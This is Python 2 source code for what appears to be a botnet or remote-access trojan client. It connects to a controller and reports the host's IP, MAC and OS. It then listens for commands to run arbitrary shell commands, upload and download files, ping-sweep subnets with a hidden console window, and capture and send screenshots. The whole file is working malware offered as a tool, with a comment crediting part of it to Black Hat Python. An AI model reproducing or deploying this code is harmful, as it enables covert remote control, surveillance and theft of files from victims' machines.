import socket
import threading
import platform
import sys
from uuid import getnode as get_mac
import subprocess
from subprocess import call
import pyscreenshot as ImageGrab
import datetime

# ---------- BOT INIT ---------- #
send_host = '127.0.0.1'
send_port = 9990

bind_host = '127.0.0.1'
bind_port = 6660

ip = socket.gethostbyname(socket.gethostname())
mac = hex(get_mac())
os = platform.platform()

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
client.connect((send_host, send_port))

client.send('[*-->online')
if client.recv(1024) == '[*-->ok':
    client.send(ip)
    client.send(mac)
    client.send(os)


# ---------- END BOT INIT ---------- #

# ---------- SCANNER STUFF ---------- #
def oct_0(ip_list_0, host_num_0, net_id_arr_0):
    host_num_0 = host_num_0 / (256 * 256 * 256)
    oct_1(ip_list_0, (256 * 256 * 256), net_id_arr_0)

    for i in range(host_num_0 - 1):
        temp = int(net_id_arr_0[0])
        temp += 1
        net_id_arr_0[0] = str(temp)

        net_id_arr_0[1] = "0"
        net_id_arr_0[2] = "0"
        net_id_arr_0[3] = "0"

        oct_1(ip_list_0, (256 * 256 * 256), net_id_arr_0)

    return ip_list_0


def oct_1(ip_list_1, host_num_1, net_id_arr_1):
    host_num_1 = host_num_1 / (256 * 256)  # e.g. for /14 will be 4
    oct_2(ip_list_1, (256 * 256), net_id_arr_1)

    for i in range(host_num_1 - 1):
        temp = int(net_id_arr_1[1])
        temp += 1
        net_id_arr_1[1] = str(temp)

        net_id_arr_1[2] = "0"
        net_id_arr_1[3] = "0"

        oct_2(ip_list_1, (256 * 256), net_id_arr_1)

    return ip_list_1


def oct_2(ip_list_2, host_num_2, net_id_arr_2):
    host_num_2 = host_num_2 / 256  # e.g. for /22 will be 4
    oct_3(ip_list_2, 256, net_id_arr_2)

    for i in range(host_num_2 - 1):
        temp = int(net_id_arr_2[2])
        temp += 1
        net_id_arr_2[2] = str(temp)

        net_id_arr_2[3] = "0"

        oct_3(ip_list_2, 256, net_id_arr_2)

    return ip_list_2


def oct_3(ip_list_3, host_num_3, net_id_arr_3):
    ip_list_3.append('.'.join(net_id_arr_3))

    for i in range(host_num_3 - 1):
        temp = int(net_id_arr_3[3])
        temp += 1
        net_id_arr_3[3] = str(temp)
        ip_list_3.append('.'.join(net_id_arr_3))

    return ip_list_3


def do_scan(addr):
    # Parse input
    ip, mask = addr.split("/")

    # Variable to store active IP's to be transmitted
    actives = ""

    # Error checking for valid mask & network ID
    if not (1 <= int(mask) <= 32):
        print "Error - incorrect input: invalid subnet mask"
        sys.exit()

    ip_arr = ip.split(".")

    for i in ip_arr:
        i = int(i)
        if not (0 <= i <= 255):
            print "Error - incorrect input: invalid IP address"
            sys.exit()

    # Figure out how many hosts
    net_bits = 32 - int(mask)
    net_hosts = pow(2, net_bits)
    all_hosts = list()

    # Depending on how many octets are affected, call and do enumeration operation(s)
    if 16777216 <= net_hosts <= 2147483648:
        all_hosts = oct_0(all_hosts, net_hosts, ip_arr)

    if 65537 <= net_hosts <= 16777216:
        all_hosts = oct_1(all_hosts, net_hosts, ip_arr)

    elif 257 <= net_hosts <= 65536:
        all_hosts = oct_2(all_hosts, net_hosts, ip_arr)

    elif 1 <= net_hosts <= 256:
        all_hosts = oct_3(all_hosts, net_hosts, ip_arr)
    else:
        print "Calculation error: exiting..."
        sys.exit()

    # Configure subprocess to hide the console window
    info = subprocess.STARTUPINFO()
    info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    info.wShowWindow = subprocess.SW_HIDE

    # For each IP address in the subnet,
    # run the ping command with subprocess.popen interface
    for i in range(len(all_hosts)):
        output = subprocess.Popen(['ping', '-n', '1', '-w', '500', str(all_hosts[i])], stdout=subprocess.PIPE,
                                  startupinfo=info).communicate()[0]

        if "Destination host unreachable" in output.decode('utf-8'):
            print(str(all_hosts[i]), "is Offline")
        elif "Request timed out" in output.decode('utf-8'):
            print(str(all_hosts[i]), "is Offline")
        else:
            print(str(all_hosts[i]), "is Online")
            actives = actives + str(all_hosts[i]) + "\n"
            client.send(actives)
            
# ---------- END SCANNER STUFF ---------- #


def execute_cmd(the_client):
    the_client.send('[*-->ok')

    cmd = the_client.recv(1024)
    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    if op:
        the_client.send('[*-->success')
        output = str(op.stdout.read())
        print "Output:", output
        client.sendall(output)
    else:
        the_client.send('[*-->failure')
        error = str(op.stderr.read())
        print "Error:", error
        client.sendall(error)


def send_file(the_client):
    the_client.send('[*-->ok')

    name = the_client.recv(1024)
    the_client.send('[*-->ok')

    if the_client.recv(1024) == '[*-->start':
        the_file = open(name, 'rb')
        file_stream = the_file.read(1024)

        while file_stream:
            print('Sending...')
            the_client.send(file_stream)
            file_stream = the_file.read(1024)

    the_client.shutdown(socket.SHUT_WR)
    the_client.close()


def get_file(the_client):
    the_client.send('[*-->ok')

    name = the_client.recv(1024)
    the_file = open(name, 'wb')
    the_client.send('[*-->ok')

    print ("Receiving")
    file_stream = the_client.recv(1024)

    while file_stream:
        print ("Receiving...")
        the_file.write(file_stream)
        file_stream = the_client.recv(1024)

    print('File Get')


def run_scan(the_client):
    the_client.send('[*-->ok')
    do_scan(client.recv(1024))


def take_screen(the_client):
    d1 = datetime.datetime.now().strftime("%Y%M%d %H%M%S")

    print(d1)
    img = ImageGrab.grab()
    img.save(str(str(d1) + '.png'), 'png')

    the_client.send('[*-->ok')
    if the_client.recv(1024) == '[*-->start':
        the_file = open(('%s.png' % d1), 'rb')
        file_stream = the_file.read(1024)
	print('Sending...')
        while file_stream:
            
            the_client.send(file_stream)
            file_stream = the_file.read(1024)

    the_client.shutdown(socket.SHUT_WR)
    the_client.close()


# ---------- TCP Server ---------- #
# Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
# TCP server to accept messages from bot, runs as a thread

# Create the socket to listen on for TCP, set the IP and port (0.0.0.0 means any I think?)
# 5 is max backlogged connections
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_host, bind_port))
server.listen(10)


def handle_client(client_socket):
    # Handles a client when the connect, called by the server, async

    request = client_socket.recv(1024)  # 1024 is the buffer size

    print("\n%s" % request)
    if request == '[*-->file_recv':
        get_file(client_socket)

    if request == '[*-->file_deliv':
        send_file(client_socket)

    if request == '[*-->cmd':
        execute_cmd(client_socket)

    if request == '[*-->scan':
        run_scan(client_socket)

    if request == '[*-->take_screen':
        take_screen(client_socket)

    client_socket.close()


# This function starts the actual server
while True:
    client, addr = server.accept()
    print('\n[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))

    # Client thread handling for incoming data
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

# ---------- END OF SERVER ---------- #
